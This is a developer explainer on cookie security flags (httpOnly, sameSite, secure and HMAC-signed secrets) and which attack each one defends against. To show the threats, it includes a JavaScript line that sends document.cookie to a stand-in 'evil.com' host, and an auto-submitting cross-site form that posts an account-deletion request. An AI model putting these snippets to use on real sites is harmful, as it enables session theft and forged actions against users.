# Cookie Security Concepts

## httpOnly

An `httpOnly` cookie cannot be read or modified by browser JavaScript — it is only sent automatically by the browser on HTTP requests.

```js
document.cookie // httpOnly cookies never appear here
```

The browser still sends it on every request to the server, but client-side JS is completely blind to it.

**What it blocks:** XSS (Cross-Site Scripting). If an attacker injects malicious JS into your page:

```js
// Without httpOnly — attacker can steal the session
fetch("https://evil.com/steal?token=" + document.cookie)

// With httpOnly — token never appears in document.cookie
```

**What it does NOT protect against:**
- CSRF (that's what `sameSite` handles)
- Network interception (that's what `secure` handles)
- Server-side compromise

---

## sameSite

Controls when the browser is allowed to send a cookie on cross-site requests. Primary defense against CSRF attacks.

**The CSRF problem it solves:**

You're logged into `yourapp.com`. An attacker tricks you into visiting `evil.com`:
```html
<form action="https://yourapp.com/delete-account" method="POST">
<script>document.forms[0].submit()</script>
```
Without `sameSite`, the browser attaches your session cookie to that request and your server executes the action.

**The three values:**

| Value | Behaviour |
|---|---|
| `strict` | Cookie sent only on same-site requests. Clicking a link from Google won't send it. |
| `lax` | Cookie sent on same-site requests + top-level GET navigations. Blocks cross-site POST/fetch. |
| `none` | Cookie sent everywhere. Requires `secure: true`. Used for third-party embeds. |

**`lax` is the right default for most web apps:**
```
User clicks link from email → GET /dashboard   ✅ cookie sent
evil.com POSTs a form to your app              ❌ cookie blocked
evil.com fetches your API via JS               ❌ cookie blocked
```

`strict` would break the common case of a user clicking a link from an email — they'd arrive logged out.

---

## secrets (HMAC Signing)

The `secrets` array is used to sign the cookie with HMAC — proving the cookie content hasn't been tampered with.

**When creating a session:**

```
1. Collect session data:
   { accessToken: "xxx", refreshToken: "yyy", userId: "123" }

2. Serialize to JSON and base64-encode:
   eyJhY2Nlc3NUb2tlbiI6Inh4eCIsInVzZXJJZCI6IjEyMyJ9

3. Sign using HMAC-SHA256 with SESSION_SECRET:
   signature = HMAC("my-secret", base64payload) → "a3f9bc..."

4. Cookie sent to browser:
   __session = <base64payload>.<signature>
```

**On every incoming request:**

```
1. Browser sends cookie back as-is
2. Server splits payload and signature
3. Re-computes HMAC("my-secret", payload)
4. Compares:
   ✅ Match    → trust the payload, read the session
   ❌ No match → session invalid, redirect to login
```

**What it blocks — cookie forgery:**

A user tries to edit the cookie in DevTools to escalate privileges:
```
Original:  eyJ1c2VySWQiOiIxMjMifQ==.a3f9bc...   ✅
Tampered:  eyJ1c2VySWQiOiJhZG1pbiJ9.a3f9bc...   ❌ signature no longer matches
```

Without knowing the secret, you cannot forge a valid signature for a modified payload.

**Secret rotation — why it's an array:**

```ts
secrets: ["new-secret", "old-secret"]
```

New cookies are signed with `secrets[0]`, but verification checks all secrets. This lets you rotate secrets without instantly logging out all existing users.

**Important caveat — signed, not encrypted:**

The payload is base64-encoded, not encrypted. Anyone with the cookie can decode and read its contents. `httpOnly` is what prevents the browser from reading it. `secrets` only prevents forgery, not reading.

---

## The full picture

```ts
httpOnly: true   // JS can't steal it         → XSS protection
sameSite: "lax"  // cross-site POST can't use it → CSRF protection
secure: true     // only sent over HTTPS       → network sniff protection
secrets: [...]   // signed, can't be forged    → tamper protection
```

Each flag defends against a different attack vector.
